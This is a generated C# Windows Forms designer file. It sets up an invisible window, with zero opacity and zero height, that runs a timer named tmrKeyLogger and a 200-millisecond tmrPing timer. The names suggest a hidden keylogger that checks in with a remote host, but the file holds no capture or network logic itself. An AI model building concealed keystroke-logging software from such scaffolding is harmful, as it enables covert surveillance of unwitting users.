namespace WindowsFormsApplication1
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.tmrKeyLogger = new System.Windows.Forms.Timer(this.components);
            this.tmrPing = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // tmrKeyLogger
            // 
            this.tmrKeyLogger.Interval = 1000;
            this.tmrKeyLogger.Tick += new System.EventHandler(this.tmrKeyLogger_Tick);
            // 
            // tmrPing
            // 
            this.tmrPing.Interval = 200;
            this.tmrPing.Tick += new System.EventHandler(this.tmrPing_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(124, 0);
            this.Name = "Form1";
            this.Opacity = 0D;
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer tmrKeyLogger;
        private System.Windows.Forms.Timer tmrPing;
    }
}

